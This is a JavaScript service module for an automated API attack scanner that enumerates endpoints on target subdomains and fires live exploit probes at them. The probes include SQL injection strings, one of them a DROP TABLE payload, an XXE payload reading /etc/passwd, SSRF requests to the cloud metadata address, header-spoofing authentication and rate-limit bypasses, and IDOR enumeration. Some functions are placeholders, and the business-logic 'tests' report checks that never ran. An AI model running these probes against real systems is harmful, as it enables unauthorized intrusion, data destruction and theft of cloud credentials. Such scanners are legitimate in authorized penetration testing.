// backend/src/services/advancedAPIService.js
const axios = require('axios');
const { exec } = require('child_process');
const { promisify } = require('util');
const execAsync = promisify(exec);
const fs = require('fs').promises;

class AdvancedAPIService {
  constructor() {
    // Common API patterns and wordlists
    this.apiPatterns = {
      // RESTful patterns
      rest: [
        '/api', '/api/v1', '/api/v2', '/api/v3',
        '/rest', '/rest/v1', '/restapi',
        '/v1', '/v2', '/v3', '/v4',
        '/endpoints', '/services'
      ],
      
      // GraphQL patterns
      graphql: [
        '/graphql', '/graphiql', '/graphql/console',
        '/api/graphql', '/v1/graphql',
        '/query', '/graph'
      ],
      
      // SOAP patterns
      soap: [
        '/soap', '/wsdl', '/services',
        '/WebService', '/webservice',
        '/Service.asmx', '/service.php'
      ],
      
      // Mobile API patterns
      mobile: [
        '/mobile', '/mobile/api', '/m/api',
        '/android', '/ios', '/app/api'
      ],
      
      // Administrative APIs
      admin: [
        '/admin/api', '/api/admin', '/management',
        '/control', '/panel/api', '/dashboard/api'
      ]
    };

    // Parameter fuzzing wordlists
    this.parameterWordlists = {
      common: ['id', 'user', 'name', 'email', 'password', 'token', 'key', 'value'],
      auth: ['auth', 'authorization', 'bearer', 'session', 'jwt', 'api_key'],
      sensitive: ['admin', 'root', 'config', 'settings', 'debug', 'internal'],
      sqli: ['id', 'user_id', 'search', 'query', 'filter', 'sort'],
      idor: ['id', 'user_id', 'account_id', 'order_id', 'file_id']
    };

    // Common API vulnerabilities to test
    this.apiVulnerabilities = [
      'authentication_bypass',
      'authorization_issues',
      'idor',
      'sql_injection',
      'nosql_injection',
      'xxe',
      'ssrf',
      'information_disclosure',
      'rate_limiting',
      'business_logic'
    ];
  }

  async discoverAndTestAPIs(scan, target, subdomains) {
    console.log(`🔍 Advanced API discovery for: ${target.domain}`);
    
    const results = {
      target_domain: target.domain,
      discovered_apis: {},
      api_vulnerabilities: [],
      documentation_found: [],
      authentication_mechanisms: [],
      rate_limiting_analysis: {},
      business_logic_tests: [],
      recommendations: [],
      scan_timestamp: new Date().toISOString()
    };

    // Step 1: API Endpoint Discovery
    console.log('🔍 Phase 1: API Endpoint Discovery');
    const discoveredAPIs = await this.discoverAPIEndpoints(subdomains, target);
    results.discovered_apis = discoveredAPIs;

    // Step 2: API Documentation Discovery
    console.log('📖 Phase 2: API Documentation Discovery');
    const documentation = await this.discoverAPIDocumentation(discoveredAPIs);
    results.documentation_found = documentation;

    // Step 3: Authentication Analysis
    console.log('🔐 Phase 3: Authentication Analysis');
    const authMechanisms = await this.analyzeAuthentication(discoveredAPIs);
    results.authentication_mechanisms = authMechanisms;

    // Step 4: Parameter Discovery & Fuzzing
    console.log('🎯 Phase 4: Parameter Discovery & Fuzzing');
    const parameterFindings = await this.discoverParameters(discoveredAPIs);
    
    // Step 5: Vulnerability Testing
    console.log('⚠️ Phase 5: API Vulnerability Testing');
    const vulnerabilities = await this.testAPIVulnerabilities(discoveredAPIs, parameterFindings);
    results.api_vulnerabilities = vulnerabilities;

    // Step 6: Rate Limiting Analysis
    console.log('⏱️ Phase 6: Rate Limiting Analysis');
    const rateLimiting = await this.analyzeRateLimiting(discoveredAPIs);
    results.rate_limiting_analysis = rateLimiting;

    // Step 7: Business Logic Testing
    console.log('🧠 Phase 7: Business Logic Testing');
    const businessLogic = await this.testBusinessLogic(discoveredAPIs);
    results.business_logic_tests = businessLogic;

    // Generate recommendations
    results.recommendations = this.generateAPIRecommendations(results);

    return results;
  }

  async discoverAPIEndpoints(subdomains, target) {
    const discoveredAPIs = {
      rest_apis: [],
      graphql_apis: [],
      soap_apis: [],
      mobile_apis: [],
      admin_apis: [],
      undocumented_apis: []
    };

    for (const subdomain of subdomains.slice(0, 10)) { // Limit for performance
      const hostname = subdomain.subdomain || subdomain;
      
      console.log(`🔍 Discovering APIs on: ${hostname}`);
      
      try {
        // Test common API patterns
        for (const [type, patterns] of Object.entries(this.apiPatterns)) {
          for (const pattern of patterns) {
            try {
              const apiUrl = `https://${hostname}${pattern}`;
              const response = await axios.get(apiUrl, {
                timeout: 8000,
                validateStatus: () => true,
                headers: {
                  'User-Agent': 'Mozilla/5.0 (compatible; APIScanner/1.0)',
                  'Accept': 'application/json, application/xml, */*'
                }
              });

              if (response.status < 500 && response.status !== 404) {
                const apiInfo = {
                  url: apiUrl,
                  status_code: response.status,
                  content_type: response.headers['content-type'] || 'unknown',
                  server: response.headers.server || 'unknown',
                  response_size: JSON.stringify(response.data).length,
                  discovery_method: 'pattern_matching',
                  subdomain: hostname
                };

                // Classify API type based on response
                if (this.isGraphQLAPI(response)) {
                  discoveredAPIs.graphql_apis.push({...apiInfo, api_type: 'GraphQL'});
                } else if (this.isSOAPAPI(response)) {
                  discoveredAPIs.soap_apis.push({...apiInfo, api_type: 'SOAP'});
                } else if (type === 'admin') {
                  discoveredAPIs.admin_apis.push({...apiInfo, api_type: 'Admin API'});
                } else if (type === 'mobile') {
                  discoveredAPIs.mobile_apis.push({...apiInfo, api_type: 'Mobile API'});
                } else {
                  discoveredAPIs.rest_apis.push({...apiInfo, api_type: 'REST'});
                }

                console.log(`✅ Found ${apiInfo.api_type || 'API'}: ${apiUrl} (${response.status})`);
              }
            } catch (error) {
              // Endpoint not accessible, continue
            }
          }
        }

        // Discover APIs from JavaScript files (if JS scan results available)
        const jsAPIs = await this.discoverAPIsFromJS(hostname);
        discoveredAPIs.undocumented_apis.push(...jsAPIs);

        // Discover APIs from known paths
        const pathAPIs = await this.discoverAPIsFromPaths(hostname);
        discoveredAPIs.undocumented_apis.push(...pathAPIs);

      } catch (error) {
        console.error(`Failed to discover APIs on ${hostname}:`, error.message);
      }
    }

    return discoveredAPIs;
  }

  async discoverAPIDocumentation(discoveredAPIs) {
    const documentation = [];
    const allAPIs = Object.values(discoveredAPIs).flat();

    for (const api of allAPIs) {
      try {
        const baseUrl = new URL(api.url).origin;
        const docPaths = [
          '/docs', '/documentation', '/api-docs',
          '/swagger', '/swagger.json', '/swagger.yaml',
          '/swagger-ui', '/swagger-ui.html',
          '/openapi.json', '/openapi.yaml',
          '/redoc', '/api/docs', '/v1/docs',
          '/graphiql', '/graphql-playground',
          '/.well-known/openapi_configuration'
        ];

        for (const docPath of docPaths) {
          try {
            const docUrl = `${baseUrl}${docPath}`;
            const response = await axios.get(docUrl, {
              timeout: 5000,
              validateStatus: () => true
            });

            if (response.status === 200) {
              documentation.push({
                api_url: api.url,
                doc_url: docUrl,
                doc_type: this.identifyDocType(docPath, response),
                accessible: true,
                contains_sensitive_info: this.checkSensitiveInfo(response.data)
              });

              console.log(`📖 Found API documentation: ${docUrl}`);
            }
          } catch (error) {
            // Documentation not accessible
          }
        }
      } catch (error) {
        console.error(`Failed to check documentation for ${api.url}:`, error.message);
      }
    }

    return documentation;
  }

  async analyzeAuthentication(discoveredAPIs) {
    const authMechanisms = [];
    const allAPIs = Object.values(discoveredAPIs).flat();

    for (const api of allAPIs) {
      try {
        // Test without authentication
        const noAuthResponse = await axios.get(api.url, {
          timeout: 8000,
          validateStatus: () => true
        });

        // Test with various auth headers
        const authTests = [
          { type: 'Bearer Token', header: 'Authorization', value: 'Bearer test' },
          { type: 'API Key', header: 'X-API-Key', value: 'test' },
          { type: 'API Key', header: 'API-Key', value: 'test' },
          { type: 'Basic Auth', header: 'Authorization', value: 'Basic dGVzdDp0ZXN0' },
          { type: 'JWT', header: 'Authorization', value: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test' }
        ];

        const authResults = {
          api_url: api.url,
          requires_auth: noAuthResponse.status === 401 || noAuthResponse.status === 403,
          auth_types_detected: [],
          auth_bypasses_possible: [],
          security_issues: []
        };

        for (const authTest of authTests) {
          try {
            const authResponse = await axios.get(api.url, {
              timeout: 8000,
              headers: { [authTest.header]: authTest.value },
              validateStatus: () => true
            });

            if (authResponse.status !== noAuthResponse.status) {
              authResults.auth_types_detected.push(authTest.type);
              
              // Check for auth bypass
              if (authResponse.status === 200 && noAuthResponse.status === 401) {
                authResults.auth_bypasses_possible.push({
                  method: authTest.type,
                  description: 'API accepts invalid/test credentials'
                });
              }
            }
          } catch (error) {
            // Auth test failed
          }
        }

        // Test for common auth bypasses
        const bypassTests = await this.testAuthBypasses(api.url);
        authResults.auth_bypasses_possible.push(...bypassTests);

        authMechanisms.push(authResults);

      } catch (error) {
        console.error(`Failed to analyze auth for ${api.url}:`, error.message);
      }
    }

    return authMechanisms;
  }

  async testAuthBypasses(apiUrl) {
    const bypasses = [];
    
    const bypassTests = [
      { method: 'HTTP Method Override', headers: { 'X-HTTP-Method-Override': 'GET' } },
      { method: 'Original URL Header', headers: { 'X-Original-URL': '/' } },
      { method: 'Rewrite URL Header', headers: { 'X-Rewrite-URL': '/' } },
      { method: 'Forwarded Host', headers: { 'X-Forwarded-Host': 'localhost' } },
      { method: 'Real IP Bypass', headers: { 'X-Real-IP': '127.0.0.1' } },
      { method: 'Client IP Bypass', headers: { 'X-Client-IP': '127.0.0.1' } }
    ];

    for (const test of bypassTests) {
      try {
        const response = await axios.get(apiUrl, {
          timeout: 5000,
          headers: test.headers,
          validateStatus: () => true
        });

        if (response.status === 200) {
          bypasses.push({
            method: test.method,
            description: 'Authentication potentially bypassable',
            severity: 'high'
          });
        }
      } catch (error) {
        // Bypass test failed
      }
    }

    return bypasses;
  }

  async discoverParameters(discoveredAPIs) {
    const parameterFindings = [];
    const allAPIs = Object.values(discoveredAPIs).flat();

    for (const api of allAPIs) {
      console.log(`🎯 Parameter discovery for: ${api.url}`);
      
      try {
        // Test common parameters
        const discoveredParams = await this.fuzzParameters(api.url);
        
        if (discoveredParams.length > 0) {
          parameterFindings.push({
            api_url: api.url,
            parameters: discoveredParams,
            discovery_method: 'fuzzing'
          });

          console.log(`✅ Found ${discoveredParams.length} parameters for ${api.url}`);
        }
      } catch (error) {
        console.error(`Parameter discovery failed for ${api.url}:`, error.message);
      }
    }

    return parameterFindings;
  }

  async fuzzParameters(apiUrl) {
    const discoveredParams = [];
    const allParams = [
      ...this.parameterWordlists.common,
      ...this.parameterWordlists.auth,
      ...this.parameterWordlists.sensitive
    ];

    // Test GET parameters
    for (const param of allParams.slice(0, 20)) { // Limit for performance
      try {
        const testUrl = `${apiUrl}?${param}=test`;
        const response = await axios.get(testUrl, {
          timeout: 5000,
          validateStatus: () => true
        });

        // Check if parameter is reflected or causes different behavior
        if (response.data && JSON.stringify(response.data).includes('test')) {
          discoveredParams.push({
            name: param,
            type: 'GET',
            reflected: true,
            potential_vulnerability: 'XSS/Injection'
          });
        } else if (response.status !== 404) {
          discoveredParams.push({
            name: param,
            type: 'GET',
            reflected: false,
            accepted: true
          });
        }
      } catch (error) {
        // Parameter test failed
      }
    }

    // Test POST parameters (if applicable)
    if (apiUrl.includes('/api/')) {
      for (const param of allParams.slice(0, 10)) {
        try {
          const response = await axios.post(apiUrl, { [param]: 'test' }, {
            timeout: 5000,
            validateStatus: () => true,
            headers: { 'Content-Type': 'application/json' }
          });

          if (response.status !== 404 && response.status !== 405) {
            discoveredParams.push({
              name: param,
              type: 'POST',
              method: 'JSON',
              status_code: response.status
            });
          }
        } catch (error) {
          // POST parameter test failed
        }
      }
    }

    return discoveredParams;
  }

  async testAPIVulnerabilities(discoveredAPIs, parameterFindings) {
    const vulnerabilities = [];
    const allAPIs = Object.values(discoveredAPIs).flat();

    for (const api of allAPIs) {
      console.log(`⚠️ Testing vulnerabilities for: ${api.url}`);
      
      try {
        // Test each vulnerability type
        for (const vulnType of this.apiVulnerabilities) {
          const vulnResults = await this.testSpecificVulnerability(api, vulnType, parameterFindings);
          vulnerabilities.push(...vulnResults);
        }
      } catch (error) {
        console.error(`Vulnerability testing failed for ${api.url}:`, error.message);
      }
    }

    return vulnerabilities;
  }

  async testSpecificVulnerability(api, vulnType, parameterFindings) {
    const vulnerabilities = [];

    switch (vulnType) {
      case 'sql_injection':
        return await this.testSQLInjection(api, parameterFindings);
      case 'idor':
        return await this.testIDOR(api, parameterFindings);
      case 'xxe':
        return await this.testXXE(api);
      case 'ssrf':
        return await this.testSSRF(api, parameterFindings);
      case 'information_disclosure':
        return await this.testInformationDisclosure(api);
      default:
        return [];
    }
  }

  async testSQLInjection(api, parameterFindings) {
    const vulnerabilities = [];
    
    const sqlPayloads = [
      "' OR '1'='1",
      "1' AND 1=1--",
      "' UNION SELECT 1,2,3--",
      "1'; DROP TABLE users--",
      "' OR 1=1#"
    ];

    // Find parameters for this API
    const apiParams = parameterFindings.find(pf => pf.api_url === api.url);
    if (!apiParams) return vulnerabilities;

    for (const param of apiParams.parameters) {
      if (this.parameterWordlists.sqli.includes(param.name)) {
        for (const payload of sqlPayloads) {
          try {
            const testUrl = `${api.url}?${param.name}=${encodeURIComponent(payload)}`;
            const response = await axios.get(testUrl, {
              timeout: 8000,
              validateStatus: () => true
            });

            // Check for SQL error indicators
            const sqlErrors = [
              'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB',
              'PostgreSQL query failed', 'SQLite/JDBCDriver'
            ];

            const responseText = JSON.stringify(response.data).toLowerCase();
            if (sqlErrors.some(error => responseText.includes(error.toLowerCase()))) {
              vulnerabilities.push({
                type: 'SQL Injection',
                api_url: api.url,
                parameter: param.name,
                payload: payload,
                severity: 'critical',
                description: 'API parameter appears vulnerable to SQL injection',
                evidence: response.data
              });

              console.log(`🚨 SQL Injection found: ${api.url}?${param.name}=${payload}`);
            }
          } catch (error) {
            // Test failed
          }
        }
      }
    }

    return vulnerabilities;
  }

  async testIDOR(api, parameterFindings) {
    const vulnerabilities = [];
    
    // Find ID-like parameters
    const apiParams = parameterFindings.find(pf => pf.api_url === api.url);
    if (!apiParams) return vulnerabilities;

    for (const param of apiParams.parameters) {
      if (this.parameterWordlists.idor.includes(param.name)) {
        try {
          // Test with different ID values
          const testIds = ['1', '2', '100', '999', '0', '-1'];
          const responses = [];

          for (const testId of testIds) {
            const testUrl = `${api.url}?${param.name}=${testId}`;
            const response = await axios.get(testUrl, {
              timeout: 5000,
              validateStatus: () => true
            });

            responses.push({ id: testId, status: response.status, data: response.data });
          }

          // Analyze responses for IDOR indicators
          const successfulResponses = responses.filter(r => r.status === 200);
          if (successfulResponses.length > 1) {
            vulnerabilities.push({
              type: 'IDOR (Insecure Direct Object Reference)',
              api_url: api.url,
              parameter: param.name,
              severity: 'high',
              description: 'API parameter allows access to different objects without authorization',
              evidence: successfulResponses.map(r => `ID ${r.id}: ${r.status}`)
            });

            console.log(`🚨 IDOR found: ${api.url}?${param.name}`);
          }
        } catch (error) {
          // IDOR test failed
        }
      }
    }

    return vulnerabilities;
  }

  async testXXE(api) {
    const vulnerabilities = [];
    
    const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <root>&xxe;</root>`;

    try {
      const response = await axios.post(api.url, xxePayload, {
        timeout: 8000,
        headers: { 'Content-Type': 'application/xml' },
        validateStatus: () => true
      });

      // Check for XXE indicators
      if (response.data && JSON.stringify(response.data).includes('root:x:0:0:')) {
        vulnerabilities.push({
          type: 'XXE (XML External Entity)',
          api_url: api.url,
          severity: 'high',
          description: 'API vulnerable to XXE attacks',
          evidence: 'System file content detected in response'
        });

        console.log(`🚨 XXE found: ${api.url}`);
      }
    } catch (error) {
      // XXE test failed
    }

    return vulnerabilities;
  }

  async testSSRF(api, parameterFindings) {
    const vulnerabilities = [];
    
    // Use a callback URL service (in production, use your own)
    const callbackUrl = 'http://169.254.169.254/latest/meta-data/';
    
    const apiParams = parameterFindings.find(pf => pf.api_url === api.url);
    if (!apiParams) return vulnerabilities;

    for (const param of apiParams.parameters) {
      if (param.name.includes('url') || param.name.includes('link') || param.name.includes('callback')) {
        try {
          const testUrl = `${api.url}?${param.name}=${encodeURIComponent(callbackUrl)}`;
          const response = await axios.get(testUrl, {
            timeout: 10000,
            validateStatus: () => true
          });

          // Check for SSRF indicators (AWS metadata)
          if (response.data && JSON.stringify(response.data).includes('ami-')) {
            vulnerabilities.push({
              type: 'SSRF (Server-Side Request Forgery)',
              api_url: api.url,
              parameter: param.name,
              severity: 'high',
              description: 'API parameter vulnerable to SSRF attacks',
              evidence: 'AWS metadata accessible'
            });

            console.log(`🚨 SSRF found: ${api.url}?${param.name}`);
          }
        } catch (error) {
          // SSRF test failed
        }
      }
    }

    return vulnerabilities;
  }

  async testInformationDisclosure(api) {
    const vulnerabilities = [];
    
    try {
      const response = await axios.get(api.url, {
        timeout: 8000,
        validateStatus: () => true
      });

      const sensitivePatterns = [
        { pattern: /password|secret|key|token/i, type: 'Credentials' },
        { pattern: /\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/, type: 'Credit Card' },
        { pattern: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/, type: 'Email Address' },
        { pattern: /\b(?:\d{1,3}\.){3}\d{1,3}\b/, type: 'IP Address' },
        { pattern: /debug|error|trace|stack/i, type: 'Debug Information' }
      ];

      const responseText = JSON.stringify(response.data);
      
      for (const pattern of sensitivePatterns) {
        if (pattern.pattern.test(responseText)) {
          vulnerabilities.push({
            type: 'Information Disclosure',
            api_url: api.url,
            info_type: pattern.type,
            severity: 'medium',
            description: `API response contains ${pattern.type.toLowerCase()}`,
            evidence: 'Sensitive information detected in response'
          });

          console.log(`🚨 Information Disclosure found: ${api.url} (${pattern.type})`);
        }
      }
    } catch (error) {
      // Information disclosure test failed
    }

    return vulnerabilities;
  }

  async analyzeRateLimiting(discoveredAPIs) {
    const rateLimitingResults = {};
    const allAPIs = Object.values(discoveredAPIs).flat();

    for (const api of allAPIs.slice(0, 5)) { // Limit for performance
      console.log(`⏱️ Testing rate limiting for: ${api.url}`);
      
      try {
        const rateLimitTest = await this.testRateLimit(api.url);
        rateLimitingResults[api.url] = rateLimitTest;
      } catch (error) {
        console.error(`Rate limit test failed for ${api.url}:`, error.message);
      }
    }

    return rateLimitingResults;
  }

  async testRateLimit(apiUrl) {
    const results = {
      has_rate_limiting: false,
      requests_before_limit: 0,
      rate_limit_headers: [],
      bypass_possible: false,
      test_details: []
    };

    try {
      // Send multiple requests to test rate limiting
      for (let i = 1; i <= 20; i++) {
        const response = await axios.get(apiUrl, {
          timeout: 5000,
          validateStatus: () => true
        });

        if (response.status === 429) {
          results.has_rate_limiting = true;
          results.requests_before_limit = i - 1;
          break;
        }

        // Check for rate limit headers
        const rateLimitHeaders = ['x-ratelimit-limit', 'x-ratelimit-remaining', 'retry-after'];
        rateLimitHeaders.forEach(header => {
          if (response.headers[header] && !results.rate_limit_headers.includes(header)) {
            results.rate_limit_headers.push(header);
          }
        });

        results.test_details.push({
          request_number: i,
          status_code: response.status,
          headers: response.headers
        });

        // Small delay between requests
        await new Promise(resolve => setTimeout(resolve, 100));
      }

      // Test rate limit bypass techniques
      if (results.has_rate_limiting) {
        results.bypass_possible = await this.testRateLimitBypass(apiUrl);
      }

    } catch (error) {
      console.error(`Rate limit test error: ${error.message}`);
    }

    return results;
  }

  async testRateLimitBypass(apiUrl) {
    const bypassMethods = [
      { name: 'X-Forwarded-For', headers: { 'X-Forwarded-For': '1.2.3.4' } },
      { name: 'X-Real-IP', headers: { 'X-Real-IP': '1.2.3.4' } },
      { name: 'X-Client-IP', headers: { 'X-Client-IP': '1.2.3.4' } },
      { name: 'User-Agent Change', headers: { 'User-Agent': 'BypassBot/1.0' } }
    ];

    for (const method of bypassMethods) {
      try {
        const response = await axios.get(apiUrl, {
          timeout: 5000,
          headers: method.headers,
          validateStatus: () => true
        });

        if (response.status !== 429) {
          console.log(`✅ Rate limit bypass possible using: ${method.name}`);
          return true;
        }
      } catch (error) {
        // Bypass test failed
      }
    }

    return false;
  }

  async testBusinessLogic(discoveredAPIs) {
    const businessLogicTests = [];
    const allAPIs = Object.values(discoveredAPIs).flat();

    // This would implement business logic testing specific to the API functionality
    // For now, return placeholder results
    
    for (const api of allAPIs.slice(0, 3)) {
      businessLogicTests.push({
        api_url: api.url,
        tests_performed: [
          'Negative quantity test',
          'Price manipulation test',
          'Workflow bypass test',
          'Permission escalation test'
        ],
        vulnerabilities_found: [],
        notes: 'Business logic testing requires manual analysis of API functionality'
      });
    }

    return businessLogicTests;
  }

  // Helper methods
  isGraphQLAPI(response) {
    const responseText = JSON.stringify(response.data).toLowerCase();
    return responseText.includes('graphql') || 
           responseText.includes('query') && responseText.includes('mutation') ||
           response.headers['content-type']?.includes('application/graphql');
  }

  isSOAPAPI(response) {
    const responseText = JSON.stringify(response.data).toLowerCase();
    return responseText.includes('soap') || 
           responseText.includes('wsdl') ||
           responseText.includes('envelope');
  }

  identifyDocType(path, response) {
    if (path.includes('swagger')) return 'Swagger/OpenAPI';
    if (path.includes('graphiql')) return 'GraphiQL';
    if (path.includes('redoc')) return 'ReDoc';
    if (response.headers['content-type']?.includes('json')) return 'JSON Documentation';
    if (response.headers['content-type']?.includes('yaml')) return 'YAML Documentation';
    return 'Unknown';
  }

  checkSensitiveInfo(data) {
    const sensitivePatterns = [
      /api[_-]?key|secret|password|token/i,
      /internal|private|admin/i,
      /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/
    ];

    const dataString = JSON.stringify(data);
    return sensitivePatterns.some(pattern => pattern.test(dataString));
  }

  async discoverAPIsFromJS(hostname) {
    // This would analyze JavaScript files for API endpoints
    // Placeholder implementation
    return [];
  }

  async discoverAPIsFromPaths(hostname) {
    // This would check common API paths
    // Placeholder implementation
    return [];
  }

  generateAPIRecommendations(results) {
    const recommendations = [];

    if (results.api_vulnerabilities.length > 0) {
      recommendations.push({
        type: 'Critical Security Issues',
        priority: 'critical',
        items: [
          'Implement proper input validation on all API endpoints',
          'Add authentication and authorization to all sensitive endpoints',
          'Enable rate limiting to prevent abuse',
          'Sanitize all user inputs to prevent injection attacks'
        ]
      });
    }

    if (results.documentation_found.some(doc => doc.contains_sensitive_info)) {
      recommendations.push({
        type: 'Information Disclosure',
        priority: 'high',
        items: [
          'Review API documentation for sensitive information exposure',
          'Restrict access to API documentation in production',
          'Remove internal endpoints from public documentation'
        ]
      });
    }

    return recommendations;
  }
}

module.exports = new AdvancedAPIService();